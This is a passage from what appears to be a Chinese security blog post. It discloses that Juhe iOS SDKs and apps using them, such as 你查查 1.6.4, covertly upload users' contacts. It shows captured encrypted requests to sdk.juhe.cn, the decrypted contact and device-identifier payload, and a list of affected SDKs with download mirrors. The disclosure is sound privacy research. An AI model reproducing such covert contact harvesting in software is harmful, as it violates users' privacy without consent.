<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="request">POST <span class="string">/initialize</span> HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="string">sdk.juhe.cn</span></span><br><span class="line"><span class="attribute">Accept</span>: <span class="string">*/*</span></span><br><span class="line"><span class="attribute">Accept-Encoding</span>: <span class="string">gzip, deflate</span></span><br><span class="line"><span class="attribute">Content-Length</span>: <span class="string">3136</span></span><br><span class="line"><span class="attribute">Content-Type</span>: <span class="string">application/x-www-form-urlencoded; charset=utf-8</span></span><br><span class="line"><span class="attribute">Accept-Language</span>: <span class="string">en;q=1</span></span><br><span class="line"><span class="attribute">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"><span class="attribute">User-Agent</span>: <span class="string">BaseStation/2.3.4 (iPhone; iOS 8.1; Scale/2.00)</span></span><br><span class="line"></span><br><span class="line"><span class="dns">73AA9E8CBE5FCFDF<span class="number">120F9C4E3</span>ADA11E5098FE158DA<span class="number">50A604D3</span>E3F22D31DFFBDD806962BCC8DD56CC<span class="number">691F11C72</span><span class="number">525983C6</span>D<span class="number">0259878085</span>EF<span class="number">80988D6493</span>A7977BD3E8AB<span class="number">0F802D54</span>E81DDC38DF<span class="number">4D1B30526</span>857EFE953AE6BE9729EDDA125CFFCE686BEB<span class="number">010E79E64</span><span class="number">6E75507B21</span>F<span class="number">15C838019</span>D1AB170B39BE4BD<span class="number">115A988B15</span>E51D0D53BF955CA1EE69492CA<span class="number">2B92951D63</span>0AAACF07DDBA6B0FC5EBF<span class="number">680558092</span>FA451EE3DD03DF<span class="number">6A1A9C68</span>BDC1DA8B435BB<span class="number">9D6153C148</span>427BB<span class="number">5B4371C90</span>71FC<span class="number">19B04A52E39</span>1960CE962CE47DB5DFFBF<span class="number">0B118050</span>BE<span class="number">1F9E08D31</span>37F0DBF3F7CA62BD3E0CEB928FC<span class="number">5D6566C4</span>F47AE<span class="number">673585E8</span>B<span class="number">2A4B6C86</span><span class="number">290B100</span>EA09BEF<span class="number">62C68C0B9</span>DA<span class="number">1774D063</span>D02DCC77C6AD08DBEE1BE<span class="number">10489D36A86</span><span class="number">7B758B8</span>F11AFFCD<span class="number">6E49D75F50</span><span class="number">51675D4F7</span>BF<span class="number">03656872665</span><span class="number">55094564929</span><span class="number">07285241129</span>C3C08FC47BB12FA<span class="number">82343E6C1</span>C5A23C8AF115D1BC074EFF2BFBDD3830CD<span class="number">2E7C64B0</span>ECE<span class="number">88888D64</span>DCEE4B0C49BBE<span class="number">809B9C90</span><span class="number">8F34596635</span><span class="number">1211F1683164</span>E<span class="number">95824121A0</span>C0F1CDD18257CDB<span class="number">57472F89D81</span>35FEB13BEC<span class="number">886D10E0</span>F<span class="number">5C694364223</span>B<span class="number">0B1441B88</span>9A8BBBD<span class="number">94241801</span>AD<span class="number">117846002D6</span>E<span class="number">7F2B247B69</span>D<span class="number">2273A612</span>C<span class="number">1D1C6D5</span>F511ACCA8016FEE51CDE6CE9E1C92FD<span class="number">44D74487E6</span>F7AB<span class="number">50F6641031</span>AE<span class="number">23B954D92</span>A4E4B8BFF<span class="number">9E696A114</span>BE3F1AEBC<span class="number">54308906271</span>0894AF<span class="number">433C0592</span>F6AB<span class="number">22E234D64C73</span>54EF<span class="number">33A9161E3</span>B3ECEA72EF216AB<span class="number">7E09A2D01</span>ECE84A09AF<span class="number">3798198C7</span>C<span class="number">4B521E81</span>709F8DDE<span class="number">72C242C34405</span>F<span class="number">715A56362</span>4AD55BF5325BCF<span class="number">4885937D79</span>C572FBDFA9D8FEE<span class="number">7F813E05</span>6CF2BAC50CEFE8086E8CA9DE<span class="number">848F0D1</span>CEFA<span class="number">4F176387</span>EE<span class="number">77F81109</span>CE602AD<span class="number">64B1C95786</span>E<span class="number">591A1B6</span>B28F0803EDF<span class="number">40B841C99</span>CA33AE<span class="number">5183815</span>AA<span class="number">0163C8858</span>A036AA<span class="number">1E0A02A70</span>2660ECD<span class="number">4F0A91963</span>F<span class="number">3E0199E06</span>868BB<span class="number">46A706F81</span><span class="number">5E0B476</span><span class="keyword">A</span><span class="number">516345D3</span>DC<span class="number">44F02475D87</span>169EFB0DD8C57FACD<span class="number">999C414127</span>E<span class="number">2B443716</span>C<span class="number">2C077A78</span><span class="number">836572211238</span>6DD49D3A4FB<span class="number">6E53342E4</span>AED<span class="number">87A8D5F6</span>F30E95EA8F7AC6418FAB<span class="number">93C7D8D0</span>FC93AE9B7357DC24877CC<span class="number">7D4A8845</span>E9FC932284CA<span class="number">56B21F5A80</span>6DAEF<span class="number">23840169D6</span>BE8E3C5EB<span class="number">8C48F3090</span>BAC<span class="number">0420B85156</span><span class="number">62F3C66085</span><span class="number">1C368255D6</span>C8D8CD<span class="number">42F712396</span>B<span class="number">68821543C00</span><span class="number">7F86422D93</span>5ED43FC<span class="number">1F4A5533</span>B<span class="number">56B09663441</span>EEDA4A4DE2AB2FA<span class="number">44E7579C1</span>F2C30A2DC0AC3DF16ECFDC5EDB<span class="number">9B7C219</span>AA46CBE8E9AFDEDECDBF177BA<span class="number">213B7A48</span>DD<span class="number">46C9D61793</span>E16F914BE8E3C5EB<span class="number">8C48F3090</span>BAC<span class="number">0420B85156</span>6A53D2AF<span class="number">64C414B5</span>FCDDD<span class="number">3B8F5A41</span>4C754DFD588FF47DBEDF19877EDEF91197EE<span class="number">260B744</span>B<span class="number">3E6B2B25</span>CE<span class="number">39480B224403</span>FA<span class="number">1E8495267</span>D17FA<span class="number">9756F7A40</span>0879EA<span class="number">235D75083030</span><span class="number">956B00E8</span><span class="keyword">A</span><span class="number">62B4708A77</span>8F0EB<span class="number">562E16C8</span>E06EB7DB7FA4B35CDC<span class="number">7C66123D09</span>FBFBC<span class="number">69B8985D90</span>8FAE76FDD279239DD8306DE<span class="number">513A206856</span>E3AB40064BEAF<span class="number">9B61971</span>ACE<span class="number">7C9A46A7</span>EFFC4C5BC<span class="number">2A80968B89</span>969BD<span class="number">1535F04663</span>F0FD7B34D96CECD<span class="number">7038867</span>BD<span class="number">9F957E38</span>F1DB<span class="number">532933F4</span>CEA<span class="number">2A1C5D6</span>D61FDD<span class="number">8D91F7F49</span><span class="number">8291F513</span>EC<span class="number">290E7C83</span><span class="number">89799D60F54</span><span class="number">62300687</span>AAC<span class="number">5E45F542</span>E22FE63FEBC8CF<span class="number">00925E0A38</span>D<span class="number">2A579116</span>AE2BFB36F300ACA<span class="number">048648A42</span><span class="number">57429F1439</span>E<span class="number">8F1E36986</span>A3B9E8CE6AD<span class="number">933B0E7</span>B<span class="number">484E34068</span>E5060DD1B76ABBEFC43BE<span class="number">7A1E4D69</span><span class="keyword">A</span><span class="number">825C24211</span>D0CF6CE8D77A9DAFFFD<span class="number">272118F335</span>B<span class="number">70E88D8A75</span>F63C92D5BE<span class="number">8A79601</span>AC8067C37BF5F6EFBA24FFE<span class="number">3D241F2F12</span>ED<span class="number">1886460516</span>C<span class="number">1C5A23C8</span>AF115D1BC074EFF2BFBDD3BE<span class="number">645B255</span>BD<span class="number">77018A65F68</span>62221ACA4749BBE<span class="number">809B9C90</span><span class="number">8F34596635</span><span class="number">1211F168308</span>6D73DA<span class="number">945916C5</span>D8EFC82C2CB859F43FACBEDAAB1084CD6CE091FBB<span class="number">20B1A159</span>FEE8FCEAA4FCA8A7ACB<span class="number">53B145F248D50</span>86D73DA<span class="number">945916C5</span>D8EFC82C2CB<span class="number">859F4591</span>E<span class="number">4F586413</span>F<span class="number">532C14C66</span>18CB12685DEBFE034BD7EF6CB<span class="number">7949682</span>DC<span class="number">04B9399E97</span>3A0F55DA9BB508CA<span class="number">5E70060E04</span>B9AAA27BBC70E1BCDBC76F5F37CA162B2ABE2933BEBFF<span class="number">30847B06F2</span>E5339BA67B8133DA5CD554C1BE5C1EFE<span class="number">85378321E29</span><span class="number">8E272F6</span>C13B9AB3DD738DBA98AC<span class="number">717C7F30</span>EBABE<span class="number">1395E76606</span>BD4F1CBACDE<span class="number">01715E2</span>AEF<span class="number">32E6C5F69</span>E0D1DF5B312BD<span class="number">2412C63C37</span><span class="number">4D5F722</span>BD9F936FE99398DCA<span class="number">88741425F62</span><span class="number">142949188544</span><span class="number">0F5267A3</span>EC3ACD611BB843FAB<span class="number">1C31078</span>AC40FD6EE365704FFADD<span class="number">5A5441903</span>C6170EECFAABCCB21F60C8CCEFE80733BB66F704BA645ED</span></span><br></pre></td></tr></table></figure>
<p>解密后结果：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"idfa"</span> : <span class="string">"13D66220-D133-4145-8D60-4A1CC99C0178"</span>,</span><br><span class="line">  <span class="string">"lon"</span> : <span class="string">""</span>,</span><br><span class="line">  <span class="string">"sim"</span> : <span class="string">"中国电信"</span>,</span><br><span class="line">  <span class="string">"type"</span> : <span class="string">"iPhone OS"</span>,</span><br><span class="line">  <span class="string">"imei"</span> : <span class="string">"321a804136f53aef66a52296f4773ba4f3c1abf0"</span>,</span><br><span class="line">  <span class="string">"os"</span> : <span class="string">"8.1"</span>,</span><br><span class="line">  <span class="string">"lat"</span> : <span class="string">""</span>,</span><br><span class="line">  <span class="string">"pname"</span> : <span class="string">"com.think-land.juhe"</span>,</span><br><span class="line">  <span class="string">"list"</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"listNickname"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"nickname"</span> : <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"listPhone"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"phoneType"</span> : <span class="string">"iOS"</span>,</span><br><span class="line">          <span class="string">"phoneNumber"</span> : <span class="string">" (0) 21110"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"phoneType"</span> : <span class="string">"iOS"</span>,</span><br><span class="line">          <span class="string">"phoneNumber"</span> : <span class="string">" (0) 10110"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"phoneType"</span> : <span class="string">"iOS"</span>,</span><br><span class="line">          <span class="string">"phoneNumber"</span> : <span class="string">" (0) 1012315"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"listOrganizations"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"company"</span> : <span class="string">"Spyware Technologies LLC"</span>,</span><br><span class="line">          <span class="string">"title"</span> : <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"disPlayName"</span> : <span class="string">"DoeJoe"</span>,</span><br><span class="line">      <span class="string">"listNoteinfo"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"noteinfo"</span> : <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"contactId"</span> : <span class="string">"1"</span>,</span><br><span class="line">      <span class="string">"listAddress"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"street"</span> : <span class="string">""</span>,</span><br><span class="line">          <span class="string">"formatAddress"</span> : <span class="string">"&#123;\n    City = Suzhou;\n    Country = China;\n    CountryCode = cn;\n    State = Jiangsu;\n    Street = \"Each St\\nChangwan\";\n    ZIP = 215000;\n&#125;"</span>,</span><br><span class="line">          <span class="string">"city"</span> : <span class="string">""</span>,</span><br><span class="line">          <span class="string">"postCode"</span> : <span class="string">""</span>,</span><br><span class="line">          <span class="string">"region"</span> : <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"listEmail"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"emailValue"</span> : <span class="string">"spyware@spyware.tld"</span>,</span><br><span class="line">          <span class="string">"emailType"</span> : <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"model"</span> : <span class="string">"iPhone"</span>,</span><br><span class="line">  <span class="string">"openid"</span> : <span class="string">"JHaf65a935c448fe7772d219d44a49e6aa"</span>,</span><br><span class="line">  <span class="string">"network"</span> : <span class="string">"CTRadioAccessTechnologyCDMAEVDORevA"</span>,</span><br><span class="line">  <span class="string">"openId"</span> : <span class="string">"JHaf65a935c448fe7772d219d44a49e6aa"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="你查查_(1-6-4)">你查查 (1.6.4)</h3><p>会上传通讯录。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="request">POST <span class="string">/initialize</span> HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="string">sdk.juhe.cn</span></span><br><span class="line"><span class="attribute">Accept</span>: <span class="string">*/*</span></span><br><span class="line"><span class="attribute">Accept-Encoding</span>: <span class="string">gzip, deflate</span></span><br><span class="line"><span class="attribute">Content-Length</span>: <span class="string">3136</span></span><br><span class="line"><span class="attribute">Content-Type</span>: <span class="string">application/x-www-form-urlencoded; charset=utf-8</span></span><br><span class="line"><span class="attribute">Accept-Language</span>: <span class="string">en;q=1</span></span><br><span class="line"><span class="attribute">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"><span class="attribute">User-Agent</span>: <span class="string">Nichacha/1.6.4 (iPhone; iOS 8.1; Scale/2.00)</span></span><br><span class="line"></span><br><span class="line"><span class="dns">73AA9E8CBE5FCFDF<span class="number">120F9C4E3</span>ADA11E5098FE158DA<span class="number">50A604D3</span>E3F22D31DFFBDD806962BCC8DD56CC<span class="number">691F11C72</span><span class="number">525983C6</span>D<span class="number">0259878085</span>EF<span class="number">80988D6493</span>A7977BD3E8AB<span class="number">0F802D54</span>E81DDC38DF<span class="number">4D1B30526</span>857EFE953AE6BE9729EDDA125CFFCE686BEB<span class="number">010E79E64</span><span class="number">6E75507B21</span>F<span class="number">15C838019</span>D1AB170B39BE4BD<span class="number">115A988B15</span>E51D0D53BF955CA1EE69492CA<span class="number">2B92951D63</span>0AAACF07DDBA6B0FC5EBF<span class="number">680558092</span>FA451EE3DD03DF<span class="number">6A1A9C68</span>BDC1DA8B435BB<span class="number">9D6153C148</span>427BB<span class="number">5B4371C90</span>71FC<span class="number">19B04A52E39</span>1960CE962CE47DB5DFFBF<span class="number">0B118050</span>BE<span class="number">1F9E08D31</span>37F0DBF3F7CA62BD3E0C9EB9EA<span class="number">5D89B024</span>EDA2DCC42BCA<span class="number">338B855</span>FD8C5C1DCCE8F5EAC43132DBB<span class="number">1B86C25B71</span>78DBCAAAE928BEB<span class="number">1B4469B36</span>CAB6B37CB52FD<span class="number">11A91F7904</span>F100CE66C88EA<span class="number">565F944</span>D78E7AC5BE9DCCB8C39BF<span class="number">165F3B46631</span><span class="number">45434B8A5</span>C8A34BE<span class="number">68F92933639</span>E75DFB<span class="number">3E55C1203</span>AE720BA<span class="number">0A32C16A47</span>B30B984AE<span class="number">14B9114F48</span><span class="number">70D1C0E8</span>E59FA<span class="number">44E7579C1</span>F2C30A2DC0AC3DF16ECFDF<span class="number">67D58706</span>ADAEC0BA91D76BE<span class="number">04386F0E26</span><span class="keyword">A</span><span class="number">9F1D262</span>DE<span class="number">155F712841</span>D<span class="number">9578969A74</span>3593DF<span class="number">6499B05365</span>D<span class="number">88B11D1D5</span>B82A369BBB5B5C48DCC8C19CBC<span class="number">9306555012</span>C<span class="number">498C42986</span>F86C47DCA46AB<span class="number">02927D0</span>FB60E0D0EA<span class="number">13104257B43</span><span class="number">7E195347833</span>CE<span class="number">93D0B4A8</span>D<span class="number">5B9E3322</span>EC<span class="number">172D27F38E56</span>7C9EFAB<span class="number">875D1208</span>F5DACFB<span class="number">752C8067</span>FD<span class="number">68D4F155449</span>E<span class="number">8E795A15</span>BE1C3AE3005BC8FA85E8EBCA35AEF<span class="number">67E5F30C26</span>BE0FB<span class="number">2626881F27</span>55E1DB<span class="number">081A02C7</span>BB78FAB79AFD<span class="number">445547A8</span><span class="keyword">A</span><span class="number">60A415C106</span>B<span class="number">9930528C27</span>1CAABCF131FC<span class="number">52112D49</span>FC<span class="number">2F9D9D20</span>A0BCF<span class="number">85745B30</span>CCFCC16CF7A32E14FA<span class="number">9B31391779</span><span class="number">1974B39D80</span><span class="number">1C60D210096</span>FBF<span class="number">7B7E006</span>C<span class="number">133999662C94</span><span class="number">595E582117</span><span class="number">6E75C29620</span>D06F09FB45C580ABCDA05C99B00DB<span class="number">72C6857C01</span>1E39AAE<span class="number">5D285B38</span><span class="number">0025A3664</span>D<span class="number">7C0F59600</span>C<span class="number">1B9006F1</span>BCEC7FE9E2F1FB<span class="number">7B4A902</span>CCE<span class="number">70C281733</span>F0312A6BED<span class="number">9402832</span>EC<span class="number">5947867D3</span>F<span class="number">2740D6831</span>CDD<span class="number">5C619A98</span>E327BD19FDBED00F54FCBD<span class="number">7817107E88</span>C2ABAD<span class="number">210A286</span>ED8C79CD97A45BC<span class="number">8A2A395</span>A0A3072BD<span class="number">38403E357</span>D<span class="number">474C26E2</span>E<span class="number">94B884711</span>CD37CC<span class="number">3B869F40</span>7B0DE<span class="number">77500D850</span>A4674BC67EF<span class="number">8C74523D67</span>90CC8C9FD<span class="number">1D541079</span>E<span class="number">0006946</span>EB71F1DC<span class="number">0E87216E94</span>AF5B1B0FE7CDD<span class="number">849D06F12</span>FAA8960C56BBDD2062BFB7486CC567780FDC35FA45B3CB<span class="number">15047D26</span>DF<span class="number">99413E30628</span>2FC4B8BA<span class="number">623E2D37</span>3B2BA05FD<span class="number">474C26E2</span>E<span class="number">94B884711</span>CD37CC<span class="number">3B869F40</span>7B0DE<span class="number">77500D850</span>A4674BC67EF<span class="number">8C7452D5</span>B<span class="number">8021062C35</span>544178EF<span class="number">469C99E44</span><span class="number">7E92F98C51</span>46DD1BA<span class="number">934A2C4</span>D1D4042FF554DD<span class="number">76A06F427</span>FF7203CCE40DC<span class="number">38B408574</span>EAC5C26B52EFF880D57EB<span class="number">289C14F0</span>F48B1CEA<span class="number">4B344F09</span>3A8019EA4B5AAE1D71DFFD03DE5FD9DCF408AA86FE<span class="number">0B3D39A7</span>AD<span class="number">77626C50549</span>6BF<span class="number">6F85F8F227</span>0FDBDC<span class="number">4C3B84367</span><span class="number">60A828A42</span><span class="number">9F8296D4</span>ACEEBEFDAC4B47DCC<span class="number">728B0A4</span>F2ED1AA<span class="number">231D88A76C7</span>EB<span class="number">42C4B10B40</span>F<span class="number">48495C8</span>DE787079ACC483DD56E4DD<span class="number">44D4408C97</span><span class="number">6E2A67865</span>5BE<span class="number">449B6A4</span>C17CB<span class="number">9B4F51236</span>FE98D4E05CEAF<span class="number">7C6F85E2</span>DA<span class="number">56A36593</span>FC28E89FAAF<span class="number">8D5D9F4</span>C2F9AE<span class="number">469199627047</span>FE<span class="number">32A10E387</span>AA28EDE<span class="number">469B6731</span>DCF<span class="number">1A136033E40</span>F0CDA<span class="number">1A2493B0</span>BF376CF88FDAF<span class="number">5F489855</span>F68E2D4EA860AF180D2CBE<span class="number">53184B1870</span>EEE<span class="number">9D61A97A88</span><span class="number">418D845</span>EA11CB9393DD<span class="number">60F098E48</span>689EF3BA<span class="number">1F0E8324</span>B099CBEC<span class="number">159817F9381</span>EB1D34EF5F242FFDD<span class="number">2D77429B4</span>F3EF61D48FAAC<span class="number">1709739E75</span>DFB<span class="number">3E55C1203</span>AE720BA<span class="number">0A32C16A9</span>C<span class="number">96A85116791</span>FD<span class="number">91B216951773</span>FC4FDFA<span class="number">44E7579C1</span>F2C30A2DC0AC3DF16ECFD8AF79ADF977AB5AC53BC2923DECD5E3EF<span class="number">8474A442</span>B13D5FB96ACBBF1794E5EF<span class="number">98C619788</span>D1F5BCEB<span class="number">497B0F2</span>D<span class="number">32422A83372</span>7BEBB465B3EBFD<span class="number">04E47246</span>DBD99AD90658AD<span class="number">018D0D6</span>EED<span class="number">7F82B3008</span>F4B63C1FE4BF<span class="number">2A6B28944</span>6DEE72601EA35025CE6F5D8FC<span class="number">4184F695</span>F4135FCD<span class="number">929C389</span>C<span class="number">42816B4361</span>C1B1BD8CFF<span class="number">3B80003E72</span>830CA<span class="number">4E373907</span>C3193CCFF1DAE934AC<span class="number">27E351B251</span>35A6B45BFB5BE<span class="number">703198B662</span>D34CF82A234CF<span class="number">8800A441</span>C403CD<span class="number">9314135</span>EFFD<span class="number">7B2C828</span>B1E0CB<span class="number">9A458095</span>C172B38DAF11EA<span class="number">203F2704B33</span><span class="number">74D943D80</span>C1EB0509CC761E6ADA<span class="number">75913B2</span>BBC392ABC<span class="number">750503D52</span><span class="number">2F15C636</span>A994FBBE36AC<span class="number">355154F7333</span>C<span class="number">99267C6</span>CECE<span class="number">5950F2477</span>AA309AF<span class="number">11E8D7A57</span>C<span class="number">058934B35</span>FB6EAE<span class="number">90D6C693</span>F<span class="number">6F053E95</span><span class="number">3D43C07A08</span>F0CB51DE16A</span></span><br></pre></td></tr></table></figure>
<p>解密后结果：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"idfa"</span> : <span class="string">"13D66220-D133-4145-8D60-4A1CC99C0178"</span>,</span><br><span class="line">  <span class="string">"lon"</span> : <span class="string">""</span>,</span><br><span class="line">  <span class="string">"sim"</span> : <span class="string">"中国电信"</span>,</span><br><span class="line">  <span class="string">"type"</span> : <span class="string">"iPhone OS"</span>,</span><br><span class="line">  <span class="string">"imei"</span> : <span class="string">"321a804136f53aef66a52296f4773ba4f3c1abf0"</span>,</span><br><span class="line">  <span class="string">"os"</span> : <span class="string">"8.1"</span>,</span><br><span class="line">  <span class="string">"lat"</span> : <span class="string">""</span>,</span><br><span class="line">  <span class="string">"pname"</span> : <span class="string">"com.thinkland.ncc"</span>,</span><br><span class="line">  <span class="string">"list"</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"listNickname"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"nickname"</span> : <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"listPhone"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"phoneType"</span> : <span class="string">"iOS"</span>,</span><br><span class="line">          <span class="string">"phoneNumber"</span> : <span class="string">" (0) 21110"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"phoneType"</span> : <span class="string">"iOS"</span>,</span><br><span class="line">          <span class="string">"phoneNumber"</span> : <span class="string">" (0) 10110"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"phoneType"</span> : <span class="string">"iOS"</span>,</span><br><span class="line">          <span class="string">"phoneNumber"</span> : <span class="string">" (0) 1012315"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"listOrganizations"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"company"</span> : <span class="string">"Spyware Technologies LLC"</span>,</span><br><span class="line">          <span class="string">"title"</span> : <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"disPlayName"</span> : <span class="string">"DoeJoe"</span>,</span><br><span class="line">      <span class="string">"listNoteinfo"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"noteinfo"</span> : <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"contactId"</span> : <span class="string">"1"</span>,</span><br><span class="line">      <span class="string">"listAddress"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"street"</span> : <span class="string">""</span>,</span><br><span class="line">          <span class="string">"formatAddress"</span> : <span class="string">"&#123;\n    City = Suzhou;\n    Country = China;\n    CountryCode = cn;\n    State = Jiangsu;\n    Street = \"Each St\\nChangwan\";\n    ZIP = 215000;\n&#125;"</span>,</span><br><span class="line">          <span class="string">"city"</span> : <span class="string">""</span>,</span><br><span class="line">          <span class="string">"postCode"</span> : <span class="string">""</span>,</span><br><span class="line">          <span class="string">"region"</span> : <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"listEmail"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"emailValue"</span> : <span class="string">"spyware@spyware.tld"</span>,</span><br><span class="line">          <span class="string">"emailType"</span> : <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"model"</span> : <span class="string">"iPhone"</span>,</span><br><span class="line">  <span class="string">"openid"</span> : <span class="string">"JHaf65a935c448fe7772d219d44a49e6aa"</span>,</span><br><span class="line">  <span class="string">"network"</span> : <span class="string">"CTRadioAccessTechnologyCDMAEVDORevA"</span>,</span><br><span class="line">  <span class="string">"openId"</span> : <span class="string">"JHaf65a935c448fe7772d219d44a49e6aa"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="受影响列表">受影响列表</h2><p>为了方便检索，我将会上传通讯录的 SDK / App 列表整理在这里。</p>
<p>注：</p>
<ol>
<li>SDK 的下载地址和更新时间为 iOS 版本里库文件的更新时间；</li>
<li>App 的更新时间为 App Store 里显示的时间。</li>
</ol>
<table>
<thead>
<tr>
<th>名称</th>
<th>版本号</th>
<th>更新时间</th>
<th>是否上传</th>
<th>下载地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>聚合数据 SDK</td>
<td>1.0.1</td>
<td>2014-09-23</td>
<td>是</td>
<td><a href="http://img.juhe.cn/sdk/JuheData_iOSSDK_v1.0.1_All.zip" target="_blank" rel="external"><del>官方下载</del></a> <a href="https://mega.co.nz/#!pE9iWLxD!bdAA9EA9R6finccP701kQPBjCdkqMtKT2-agKeMb0LA" target="_blank" rel="external">MEGA</a></td>
</tr>
<tr>
<td>短信验证码 SDK</td>
<td>1.0.1</td>
<td>2014-11-01</td>
<td>是</td>
